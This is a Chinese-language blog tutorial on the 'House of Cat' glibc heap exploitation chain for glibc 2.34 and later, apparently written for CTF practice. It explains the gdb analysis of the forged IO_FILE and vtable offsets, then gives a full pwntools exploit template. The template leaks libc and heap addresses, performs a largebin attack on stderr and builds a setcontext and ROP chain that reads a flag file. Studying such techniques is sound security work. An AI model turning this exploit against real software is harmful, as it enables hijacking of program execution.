@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用 链路分析触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of Cat">
+<meta property="og:url" content="http://example.com/2023/06/07/House-of-Cat/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="前言2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用 链路分析触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071948385.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071949732.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071950790.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952330.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952818.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071955725.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072141373.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072142170.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072143662.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072145818.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072147683.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072158957.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072238743.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072244289.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072247250.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072253308.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072254569.png">
+<meta property="article:published_time" content="2023-06-07T06:08:44.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:19:24.661Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>House of Cat</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/06/House-of-Emma/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/06/07/House-of-Cat/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/06/07/House-of-Cat/&text=House of Cat"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/06/07/House-of-Cat/&is_video=false&description=House of Cat"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House of Cat&body=Check out this article: http://example.com/2023/06/07/House-of-Cat/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/06/07/House-of-Cat/&title=House of Cat"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/06/07/House-of-Cat/&name=House of Cat&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/06/07/House-of-Cat/&t=House of Cat"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">链路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">伪造分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">4.</span> <span class="toc-text">模板</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        House of Cat
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-07T06:08:44.000Z" class="dt-published" itemprop="datePublished">2023-06-07</time>
+        
+        (Updated: <time datetime="2023-09-14T17:19:24.661Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/heap/">heap</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用</p>
+<h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同 接下来跟着我来分析一下</p>
+<p>截止到__main_assert函数的时候 链路都和house of kiwi一致 这里就不复述了</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png" title="image-20230607194023571" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png" alt="image-20230607194023571"></a></p>
+<p>不同的是 kiwi是利用fflush触发fake file 本次我们是通过fxprintf中的函数 来实现任意函数调用</p>
+<p>原理是因为vtable虽然在2.24以后加入了检测 但是由于检测不严格 对于一些轻微的偏移可以被无视 所以我们可以修改vtable为其他的表并且加上偏移 就可以实现表内的函数任意调用</p>
+<p>而在这些函数中 会存在一些以寄存器寻址的call指令 利用这一点我们就可以劫持程序执行流</p>
+<p>本次利用的关键就是_IO_wfile_seekoff函数 其内部会调用IO_switch_to_wget_mode函数 该函数内部存在一个可以被我们控制的call指令 </p>
+<p>我们首先利用largebinattack将stderr的地址覆盖为堆地址 随后在堆中伪造结构体 将vtable结构体修改为_IO_wfile_jumps+0x10  这样就可以顺利调用到_IO_wfile_seekoff函数 </p>
+<p>接着回到gdb 我们跟进一下fxprintf函数 一起完整的过一遍链</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071948385.png" title="image-20230607194845339" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071948385.png" alt="image-20230607194845339"></a></p>
+<p>我们还需要进行两次繁琐的函数跳转 随后才能到达利用的关键函数点</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071949732.png" title="image-20230607194918695" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071949732.png" alt="image-20230607194918695"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071950790.png" title="image-20230607195056744" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071950790.png" alt="image-20230607195056744"></a></p>
+<p>这里 就会进入被我们所伪造的vtable表固定的偏移中 在我们上面那样设置的情况下 最后是会调用到_IO_wfile_seekoff函数 我们跟进一下</p>
+<p>可以看到 其内部存在IO_switch_to_wget_mode函数 我们跟进一下</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952330.png" title="image-20230607195213304" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952330.png" alt="image-20230607195213304"></a></p>
+<p>这里存在一个可控的call指令 rax的值可以被我们所操控 是写入到stderr上的堆地址固定偏移的一块地址</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952818.png" title="image-20230607195245775" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952818.png" alt="image-20230607195245775"></a></p>
+<p>如果我们在此处地方写入打setcontext用的万能gadget 再搭配上setcontext 就可以做到控制程序执行流</p>
+<p>链路其实是比较清晰的 我们主要是来看一下如何伪造 很多网上的资料其实伪造部分都没有讲清楚</p>
+<h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071955725.png" title="image-20230607195552637" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071955725.png" alt="image-20230607195552637"></a></p>
+<p>首先我们提供一个完整的fake file构成 我们根据上面所圈出来的框 依次来讲解为什么要如此设定 需要绕过哪些地方 因为授人以鱼不如授人以渔  教会如何利用好动调来伪造结构体才是最重要的  虽然这篇文章也不能让你马上掌握这个能力</p>
+<p>首先是灰框部分 之所以要这样布局 我们先来看前面的这个libc地址 要明白其用意何在 我们首先要定义到需要这个参数的位置 我的办法是直接n 通常会直接卡在某个语句或者触发某个报错 通过这个办法来判断执行到了哪个汇编语句</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072141373.png" title="image-20230607214112329" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072141373.png" alt="image-20230607214112329"></a></p>
+<p>可以看到 是触发了进程的终止 那么这个一般是由于vtable表的检测失败引起的</p>
+<p>为了佐证我们的猜想 我们找到触发检测的函数 随后直接n 看能不能通过这个函数 结果发现不行 印证了猜想 那么我们要想绕过这一点 显然就是靠最近的一次判断 只要不跳转到执行vtable表检测的地方就行了</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072142170.png" title="image-20230607214227141" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072142170.png" alt="image-20230607214227141"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072143662.png" title="image-20230607214344636" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072143662.png" alt="image-20230607214344636"></a></p>
+<p>关键的两个寄存器 就是rcx和rax了 rcx最后一次的复制和rax有关系 而rax当时的值是一个相对固定的</p>
+<p>rax最初的值是一个相对固定的 索引到的是一个libc地址</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072145818.png" title="image-20230607214540799" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072145818.png" alt="image-20230607214540799"></a></p>
+<p>而执行到sub的时候 对应的参数是一个栈上的地址</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072147683.png" title="image-20230607214732659" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072147683.png" alt="image-20230607214732659"></a></p>
+<p>显然sub后的rax值我们并没有办法改变 那么重点就是放在通过r12来影响rax的值</p>
+<p>注意到最开始r12的赋值语句 和rbp有关系 而rbp的值正是我们的fake file的起始地址 而对应的偏移正是我们所说的灰色部分 但是由于赋值完以后还要减去rdi寄存器的值 所以最后赋值给rax的值最好比较大一点</p>
+<p>接下来 我们根据程序执行流跟进到_IO_wfile_seekoff函数 可以看到要想成功执行到Io_switch_to_wget_mode函数 就需要我们通过上面的cmp判断 rcx和rdx这两个寄存器 分别溯源一下最后一次赋值</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072158957.png" title="image-20230607215836928" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072158957.png" alt="image-20230607215836928"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072238743.png" title="image-20230607223758680" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072238743.png" alt="image-20230607223758680"></a></p>
+<p>和rax有关 而rax为fake file的起始地址 对应的偏移处是我们最开始图片的红框 我们要使得二者的值不一样 才能进入_IO_wfile_seekoff函数</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072244289.png" title="image-20230607224446247" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072244289.png" alt="image-20230607224446247"></a></p>
+<p>进入_IO_wfile_seekoff  可以看到此时我们就可以进行任意地址call了  对应的偏移是0xe0 对应着我们最开始图片的</p>
+<p>黄框 并且另外一个参数还有作用 这个后面遇到了再讲</p>
+<p>接着就是万能gadget的调用了</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072247250.png" title="image-20230607224751228" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072247250.png" alt="image-20230607224751228"></a></p>
+<p>此时rdi的值就是fake file的起始地址 我们需要给其设定对应的值 以此来决定rdx的值 从而控制最后的call</p>
+<p>对应着我们图片中的红框蓝框 我们将其布置好 使得接下来执行setcontext</p>
+<p>然后后面的就是setcontext的利用问题了 这里就不讲了</p>
+<p>没有提到的是紫色框中的参数 这一部分 我们直接将其赋为0  随后n看会卡在哪个地方</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072253308.png" title="image-20230607225320272" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072253308.png" alt="image-20230607225320272"></a></p>
+<p>可以看到会卡在这里 这里是因为rdi+8处不是一个地址 但是这里的cmp又要调用对应地址的内容 所以就无法进行 我们溯源一下 看看rdi的值是怎么得到的</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072254569.png" title="image-20230607225424542" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072254569.png" alt="image-20230607225424542"></a></p>
+<p>可以看到和rbx有关系 而动调发现rbx的值就是fake file的起始地址 所以在对应地址布置一下就好了</p>
+<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>首先泄露libc地址和hepa地址 随后利用largebinattaack在stderr写入可控堆块地址用来充当fake file</p>
+<p>随后布置好结构体 利用top chunk或者largebin chunk来触发io链 最后orw</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x420</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a0b0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;Heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">stderr_addr = libc_addr + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x0000000000165fa0</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x000000000005f65a</span></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x0000000000028a87</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gadget_addr = <span class="number">0x0000000000165fa0</span>+libc_addr</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ioaddr=heap_addr+<span class="number">0x6e0</span></span><br><span class="line">flag_addr = heap_addr+<span class="number">0x728</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x730</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(setcontext_addr)</span><br><span class="line">fake_IO_FILE +=p64(gadget_addr)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_addr+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(ioaddr) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_addr+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_addr+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)+p64(heap_addr+<span class="number">0x740</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_addr+<span class="number">0x7e0</span>)+p64(ret_addr)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(heap_addr+<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">fake_IO_FILE += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(heap_addr+<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(fake_IO_FILE),fake_IO_FILE)</span><br><span class="line">payload = cyclic(<span class="number">0x508</span>)+p64(<span class="number">0x300</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x143A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">add(<span class="number">0x1000</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">链路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">伪造分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">4.</span> <span class="toc-text">模板</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/06/07/House-of-Cat/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/06/07/House-of-Cat/&text=House of Cat"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
